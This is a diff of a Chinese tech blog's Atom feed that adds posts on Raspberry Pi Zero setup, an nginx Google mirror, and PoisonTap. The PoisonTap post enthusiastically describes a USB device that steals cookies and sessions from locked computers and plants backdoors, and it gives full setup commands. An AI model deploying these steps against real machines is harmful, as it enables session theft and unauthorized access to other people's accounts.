@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://blog.yfgeek.com/"/>
-  <updated>2016-12-07T00:43:58.000Z</updated>
+  <updated>2016-12-18T19:20:52.000Z</updated>
   <id>http://blog.yfgeek.com/</id>
   
   <author>
@@ -14,6 +14,207 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>30秒内盗取任意PC的Cookie神器 PoisonTap</title>
+    <link href="http://blog.yfgeek.com/2016/12/18/poisontap/"/>
+    <id>http://blog.yfgeek.com/2016/12/18/poisontap/</id>
+    <published>2016-12-18T18:44:51.000Z</published>
+    <updated>2016-12-18T19:20:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。</p>
+<p>是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。</p>
+<a id="more"></a>
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>PoisonTap 通吃 Windows/Mac/Linux系统。其实现原理十分猥琐。</p>
+<p><img src="/content/images/poisontap/1.gif" alt=""></p>
+<p>把自己伪装成有线网卡，一旦插入系统中，众所周知，所有的操作系统的规则都是这样的：</p>
+<blockquote>
+<p>有线网络&gt;无线网络</p>
+</blockquote>
+<p>也就是说，如果他连接着Wi-Fi，没关系，系统会以我的伪网卡为最高优先级。在系统处于锁屏状态下，只要有网络通信，无论系统通信哪个都会被强制跳转到我用于 攻击你的页面 ，成批量的窃取你的Cookie和Session。</p>
+<p>没错，就是你猜到的MITM，中间人攻击。通过PoisonTap，我们可以：</p>
+<ul>
+<li>模拟成一个伪USB网卡</li>
+<li>不需要解锁电脑就可以实现攻击</li>
+<li>劫持系统所有网络连接的所有流量 包括局域网</li>
+<li>窃取储存Alexa前一百万的网站的Cookie和Session</li>
+<li>用远程outbound的方式进行WebSocket或DNS重绑定攻击</li>
+<li>用HTTP的JS缓存禁止对该PC进行web后门安装，缓存涉及到上千个域名和cdn js缓存供应商</li>
+<li>截取Cookie后可以使用该PC的Cookie进行登录，实现中间人攻击的最终目标</li>
+</ul>
+<p><img src="/content/images/poisontap/2.gif" alt=""></p>
+<p>PoisonTap比你想象的更强大的是，PoisonTap能够突破以下普通MITM办不到的几点：</p>
+<ul>
+<li>锁屏密码</li>
+<li>路由表ARP的优先级设置和网络适配器优先级设置</li>
+<li>同源策略 (Same-Origin Policy)</li>
+<li>X-Frame-Options 响应头攻击</li>
+<li>Cookie的HttpOnly安全设置</li>
+<li>Cookie的SameSite安全属性</li>
+<li>两步/多步验证密码(2FA/MFA)</li>
+<li>DNS劫持</li>
+<li>跨域资源共享CORS</li>
+<li>HTTPS cookie 保护</li>
+</ul>
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>接着昨天的零网络配置，我们不需要任何网口 WiFi 蓝牙 就可以完成配置。</p>
+<p>注意！配置前请保证<code>apt-get</code>命令是可以用的且可以联网的，配置过程中不允许出错，否则会出大问题。</p>
+<p>首先，我们在本机下载下来这个神器Poisontap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/samyk/poisontap</div></pre></td></tr></table></figure>
+<p>然后，我们用scp命令把Poisontap传到Raspberry Pi Zero上。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp -r poisontap pi@zero.local:~</div></pre></td></tr></table></figure></p>
+<p>登录到树莓派上，运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> poisontap</div><div class="line"><span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 1.0.0.1\n\tnetmask 0.0.0.0"</span> &gt;&gt; /etc/network/interfaces</div><div class="line"><span class="built_in">echo</span> <span class="string">"dtoverlay=dwc2"</span> &gt;&gt; /boot/config.txt</div><div class="line"><span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"dwc2\ng_ether"</span> &gt;&gt; /etc/modules</div><div class="line">sudo sed --in-place <span class="string">"/exit 0/d"</span> /etc/rc.local</div><div class="line"><span class="built_in">echo</span> <span class="string">"/bin/sh /home/pi/poisontap/pi_startup.sh"</span> &gt;&gt; /etc/rc.local</div><div class="line">mkdir /home/pi/poisontap</div><div class="line">chown -R pi /home/pi/poisontap</div><div class="line">apt-get update &amp;&amp; apt-get upgrade</div><div class="line">apt-get -y install isc-dhcp-server dsniff screen nodejs</div></pre></td></tr></table></figure></p>
+<p>确保以上都成功后，运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo cp dhcpd.conf /etc/dhcp/dhcpd.conf</div><div class="line">reboot</div></pre></td></tr></table></figure></p>
+<p>好了，已经安装好了，接下来我们可以Hack啦~</p>
+<h1 id="Hack"><a href="#Hack" class="headerlink" title="Hack"></a>Hack</h1><h2 id="Cookie-和-Session窃取"><a href="#Cookie-和-Session窃取" class="headerlink" title="Cookie 和 Session窃取"></a>Cookie 和 Session窃取</h2><p>把配置好的树莓派重新插入电脑里，这时他已经变成了黑阔神器了。</p>
+<p>为了使攻击过程可视化，我们访问 www.google.com</p>
+<p><img src="/content/images/poisontap/4.png" alt=""></p>
+<p>动画非常炫酷，这时候已经在窃取成千上万的网站的Cookie了，吃个小饼干。</p>
+<p><img src="/content/images/poisontap/5.png" alt=""></p>
+<p>打开Chrome的工具看一看，哇。</p>
+<p>随后，Cookie都被保存在树莓派里了，我们连接上树莓派的SSH，看一下，成功。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat poisontap.cookies.log</div></pre></td></tr></table></figure>
+<p><img src="/content/images/poisontap/3.png" alt=""></p>
+<h2 id="伪造网站"><a href="#伪造网站" class="headerlink" title="伪造网站"></a>伪造网站</h2><h2 id="远程后门"><a href="#远程后门" class="headerlink" title="远程后门"></a>远程后门</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/samyk/poisontap" target="_blank" rel="external">https://github.com/samyk/poisontap</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。&lt;/p&gt;
+&lt;p&gt;是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="hack" scheme="http://blog.yfgeek.com/categories/hack/"/>
+    
+    
+      <category term="hack" scheme="http://blog.yfgeek.com/tags/hack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Raspberry Pi Zero 无需键盘网络 配置教程</title>
+    <link href="http://blog.yfgeek.com/2016/12/17/raspizero/"/>
+    <id>http://blog.yfgeek.com/2016/12/17/raspizero/</id>
+    <published>2016-12-17T21:58:26.000Z</published>
+    <updated>2016-12-18T03:42:49.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>我大概是个Raspberry Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。</p>
+<p>上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。</p>
+<a id="more"></a> 
+<p>请注意，不要认为所谓的4磅很便宜，毕竟，我还多掏了2.50磅的邮费。树莓派Zero在中国并不便宜，因为树莓派Zero的产能有限，每周只能供很少的货，买树莓派Zero就像抢12306一样，我抢了两周，也正是因为这个原因，树莓派Zero在亚马逊的黄牛卖家卖20磅，淘宝卖120元左右，实际上原价只有40元左右。</p>
+<h1 id="信仰充值"><a href="#信仰充值" class="headerlink" title="信仰充值"></a>信仰充值</h1><p>滴！信仰充值成功！</p>
+<p><img src="/content/images/raspizero/mail.jpg" alt=""></p>
+<p>没有错，你没有看错，就是这么小，但是小也有小的坏处，没有USB口，没有Wi-Fi，没有网线接口，似乎什么都没有用。</p>
+<ul>
+<li>1Ghz, Single-core CPU</li>
+<li>512MB RAM</li>
+<li>Mini HDMI and USB On-The-Go ports</li>
+<li>Micro USB power</li>
+<li>HAT-compatible 40-pin header</li>
+<li>Composite video and reset headers</li>
+</ul>
+<p>不过值得一提的是，USB On-The-Go接口也可以用来供电。</p>
+<h1 id="发车"><a href="#发车" class="headerlink" title="发车"></a>发车</h1><p>网络上关于树莓派Zero如何连接配置大概有以下几种：</p>
+<ul>
+<li>OTG口转USB 接 USB以太网适配器</li>
+<li>OTG口转USB 接 USB Wi-Fi</li>
+<li>OTG口转USB 接 USB键盘 且 用HDMI接显示器</li>
+<li>GPIO接以太网适配器</li>
+</ul>
+<p>但是以上，都太麻烦了，对不对？</p>
+<p>那么关键问题就来了，如何才能在 没有网口、没有Wi-Fi、没有显示器、没有鼠标、没有键盘的情况下 配置可爱的树莓派Zero呢？</p>
+<p>我们 可以 把 树莓派 虚拟为 网卡，然后在内网连接它。</p>
+<p>1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">diskutil list</div><div class="line">diskutil unmountDisk /dev/SD卡的标号 <span class="comment">#如disk2</span></div><div class="line"><span class="built_in">cd</span> /Users/ivan/Downloads/2016-11-25-raspbian-jessie <span class="comment">#进入目录</span></div><div class="line">sudo dd bs=1m <span class="keyword">if</span>=2016-11-25-raspbian-jessie.img of=/dev/rdisk2</div></pre></td></tr></table></figure>
+<p>2.刷好系统后编辑<code>config.txt</code>文件，在最后一行下，另起一行添加：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>
+<p>保存文件</p>
+<p>3.最后，打开<code>cmdline.txt</code>文件。<br>找到单词<code>rootwait</code>，在其之后添加：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure>
+<p>4.添加一个文件名为<code>ssh</code>到根目录下，内容为空</p>
+<p>5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。</p>
+<p><img src="/content/images/raspizero/1.png" alt=""></p>
+<p>6.Ping 一下raspberrypi.local看是否能通</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PING raspberrypi.local (169.254.70.245): 56 data bytes</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms</div></pre></td></tr></table></figure>
+<p>7.ssh连接raspberrypi.local，默认密码为raspberry<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pi@raspberrypi.local</div></pre></td></tr></table></figure></p>
+<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>因为没有网络，只能通过下载离线安装文件，传输到树莓派内，再在树莓派里安装。</p>
+<h2 id="配置树莓派"><a href="#配置树莓派" class="headerlink" title="配置树莓派"></a>配置树莓派</h2><p>通过直接运行<code>raspi-config</code>命令</p>
+<p>你需要做</p>
+<ul>
+<li>容量扩展</li>
+<li>更改系统时区</li>
+<li>更改系统密码</li>
+</ul>
+<p>同时你需要通过执行<code>sudo passwd root</code>更改root密码</p>
+<h2 id="安装vnc-server"><a href="#安装vnc-server" class="headerlink" title="安装vnc-server"></a>安装vnc-server</h2><p>首先，去<a href="https://www.realvnc.com/download/vnc/raspberrypi/" target="_blank" rel="external">VNC官网</a>下载最新版本的vnc-server</p>
+<p>用scp命令传到树莓派上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp /Users/ivan/Downloads/VNC-5.3.2-Linux-ARM-DEB.tar.gz  pi@raspberrypi.local:~</div></pre></td></tr></table></figure>
+<p>在树莓派shell下，安装VNC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tar xvf VNC-5.3.2-Linux-ARM-DEB.tar.gz</div><div class="line">sudo dpkg -i VNC-Server-5.3.2-Linux-ARM.deb</div></pre></td></tr></table></figure></p>
+<p><img src="/content/images/raspizero/2.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vncpasswd -user  # 设置连接密码</div><div class="line">vncserver  # 启动vncserver</div></pre></td></tr></table></figure>
+<p>连接raspberry.local:1测试成功</p>
+<p><img src="/content/images/raspizero/3.png" alt=""></p>
+<h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><p>本来想着，既然把它虚拟为网卡了，能否NAT网络给他让他上网？事实上，是失败的。</p>
+<p>那么我们有一个临时解决方案，就是设置代理</p>
+<p>首先，在本机搭建一个squid</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">brew update</div><div class="line">brew install squid</div></pre></td></tr></table></figure>
+<p>然后下载<a href="http://squidman.net/squidman/" target="_blank" rel="external">SquidMan</a>，安装。<br>在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。</p>
+<p>进入树莓派shell，输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /etc/apt/apt.conf.d</div><div class="line">sudo vi /etc/apt/apt.conf.d</div></pre></td></tr></table></figure></p>
+<p>最后一行加入一句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Acquire::http::Proxy &quot;http://Mac.local:8080&quot;;</div></pre></td></tr></table></figure></p>
+<p>保存</p>
+<p>apt-get update一下，怎么样是不是能装软件了？</p>
+<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>这块小板子，我太喜欢了，好精致</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md" target="_blank" rel="external">https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;我大概是个Raspberry Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。&lt;/p&gt;
+&lt;p&gt;上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Raspberry" scheme="http://blog.yfgeek.com/categories/Raspberry/"/>
+    
+    
+      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Google镜像站的搭建</title>
+    <link href="http://blog.yfgeek.com/2016/12/11/Google%E9%95%9C%E5%83%8F%E7%AB%99%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
+    <id>http://blog.yfgeek.com/2016/12/11/Google镜像站的搭建/</id>
+    <published>2016-12-11T19:21:59.000Z</published>
+    <updated>2016-12-11T19:30:30.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。</p>
+<a id="more"></a>
+<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Centos 6 </p>
+<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><ol>
+<li>nginx</li>
+<li>pcre 正则</li>
+<li>ngx_http_proxy_module 反向代理</li>
+<li>ngx_http_substitutions_filter_module 多重替换</li>
+</ol>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 安装 gcc &amp; git</span></div><div class="line"><span class="comment">#</span></div><div class="line">apt-get install build-essential git gcc g++ make</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载最新版源码</span></div><div class="line"><span class="comment"># nginx 官网: </span></div><div class="line"><span class="comment"># http://nginx.org/en/download.html</span></div><div class="line"><span class="comment">#</span></div><div class="line">wget <span class="string">"http://nginx.org/download/nginx-1.7.8.tar.gz"</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载最新版 pcre</span></div><div class="line"><span class="comment"># pcre 官网:</span></div><div class="line"><span class="comment"># http://www.pcre.org/</span></div><div class="line"><span class="comment">#</span></div><div class="line">wget <span class="string">"ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.38.tar.gz"</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载最新版 openssl</span></div><div class="line"><span class="comment"># opessl 官网:</span></div><div class="line"><span class="comment"># https://www.openssl.org/</span></div><div class="line"><span class="comment">#</span></div><div class="line">wget <span class="string">"https://www.openssl.org/source/openssl-1.0.1j.tar.gz"</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载最新版 zlib</span></div><div class="line"><span class="comment"># zlib 官网:</span></div><div class="line"><span class="comment"># http://www.zlib.net/</span></div><div class="line"><span class="comment">#</span></div><div class="line">wget <span class="string">"http://zlib.net/zlib-1.2.8.tar.gz"</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载本扩展</span></div><div class="line"><span class="comment">#</span></div><div class="line">git <span class="built_in">clone</span> https://github.com/cuber/ngx_http_google_filter_module</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 下载 substitutions 扩展</span></div><div class="line"><span class="comment">#</span></div><div class="line">git <span class="built_in">clone</span> https://github.com/yaoweibin/ngx_http_substitutions_filter_module</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 解压缩</span></div><div class="line"><span class="comment">#</span></div><div class="line">tar xzvf nginx-1.7.8.tar.gz</div><div class="line">tar xzvf pcre-8.38.tar.gz</div><div class="line">tar xzvf openssl-1.0.1j.tar.gz</div><div class="line">tar xzvf zlib-1.2.8.tar.gz</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 进入 nginx 源码目录</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="built_in">cd</span> nginx-1.7.8</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 设置编译选项</span></div><div class="line"><span class="comment">#</span></div><div class="line">./configure \</div><div class="line">  --prefix=/opt/nginx-1.7.8 \</div><div class="line">  --with-pcre=../pcre-8.38 \</div><div class="line">  --with-openssl=../openssl-1.0.1j \</div><div class="line">  --with-zlib=../zlib-1.2.8 \</div><div class="line">  --with-http_ssl_module \</div><div class="line">  --add-module=../ngx_http_google_filter_module \</div><div class="line">  --add-module=../ngx_http_substitutions_filter_module</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 编译, 安装</span></div><div class="line"><span class="comment"># 如果扩展有报错, 请发 issue 到</span></div><div class="line"><span class="comment"># https://github.com/cuber/ngx_http_google_filter_module/issues</span></div><div class="line"><span class="comment">#</span></div><div class="line">make</div><div class="line">sudo make install</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 启动, 安装过程到此结束</span></div><div class="line"><span class="comment">#</span></div><div class="line">sudo /opt/nginx-1.7.8/sbin/nginx</div><div class="line"></div><div class="line">vi /opt/nginx-1.7.8/conf/nginx.conf</div></pre></td></tr></table></figure>
+<p>http配置方式<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">  server_name &lt;你的域名&gt;;</div><div class="line">  listen <span class="number">80</span>;</div><div class="line"></div><div class="line">  resolver <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>;</div><div class="line">  location / &#123;</div><div class="line">    google on;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>https配置方式<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">  server_name &lt;你的域名&gt;;</div><div class="line">  listen <span class="number">443</span>;</div><div class="line"></div><div class="line">  ssl on;</div><div class="line">  ssl_certificate &lt;你的证书&gt;;</div><div class="line">  ssl_certificate_key &lt;你的私钥&gt;;</div><div class="line"></div><div class="line">  resolver <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>;</div><div class="line">  location / &#123;</div><div class="line">    google on;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>随后<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 配置修改后, 需要 reload nginx 来让配置生效, </span></div><div class="line"><span class="comment">#</span></div><div class="line">sudo /opt/nginx-1.7.8/sbin/nginx <span class="_">-s</span> reload</div></pre></td></tr></table></figure></p>
+<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>测试一下网站，是可以访问的，出于一些原因，我个人搭建的镜像站不予公开。</p>
+<h1 id="参考技术"><a href="#参考技术" class="headerlink" title="参考技术"></a>参考技术</h1><p><a href="https://github.com/cuber/ngx_http_google_filter_module" target="_blank" rel="external">https://github.com/cuber/ngx_http_google_filter_module</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Ops" scheme="http://blog.yfgeek.com/categories/Ops/"/>
+    
+    
+      <category term="Ops" scheme="http://blog.yfgeek.com/tags/Ops/"/>
+    
+  </entry>
   
   <entry>
     <title>OTR(Off-the-Record) 技术探讨</title>
@@ -233,11 +434,11 @@
 <p>好的输入地址，我么进入第一关</p>
 <h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><p><a href="http://monyer.com/game/game1/first.php" target="_blank" rel="external">http://monyer.com/game/game1/first.php</a></p>
 <p>打开页面依然是什么都没有，这很正常。审查工具看代码。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/rocketscript"</span> <span class="attr">data-rocketoptimized</span>=<span class="string">"true"</span>&gt;</span><span class="undefined"></span></div><div class="line">    function check()&#123;</div><div class="line">        if(document.getElementById('txt').value=="  ")&#123;</div><div class="line">            window.location.href="hello.php";</div><div class="line">        &#125;else&#123;</div><div class="line">            alert("密码错误");</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/rocketscript"</span> <span class="attr">data-rocketoptimized</span>=<span class="string">"true"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">'txt'</span>).value==<span class="string">"  "</span>)&#123;</div><div class="line">            <span class="built_in">window</span>.location.href=<span class="string">"hello.php"</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            alert(<span class="string">"密码错误"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
 <p>好了 我们知道密码了，并且知道下一关的文件是hello.php</p>
 <h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><p><a href="http://monyer.com/game/game1/hello.php" target="_blank" rel="external">http://monyer.com/game/game1/hello.php</a></p>
 <p>审查工具看源代码，head中</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/rocketscript"</span> <span class="attr">data-rocketoptimized</span>=<span class="string">"true"</span>&gt;</span><span class="undefined"></span></div><div class="line">    document.oncontextmenu=function()&#123;return false&#125;;</div><div class="line"></div><div class="line">    var a,b,c,d,e,f,g;</div><div class="line">    a = 3.14;</div><div class="line">    b = a * 2;</div><div class="line">    c = a + b;</div><div class="line">    d = c / b + a;</div><div class="line">    e = c - d * b + a;</div><div class="line">    f = e + d /c -b * a;</div><div class="line">    g = f * e - d + c * b + a;</div><div class="line">    a = g * g;</div><div class="line">    a = Math.floor(a);</div><div class="line"></div><div class="line">    function check()&#123;</div><div class="line">        if(document.getElementById("txt").value==a)&#123;</div><div class="line">            window.location.href=a + ".php";</div><div class="line">        &#125;else&#123;</div><div class="line">            alert("密码错误");</div><div class="line">            return false;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
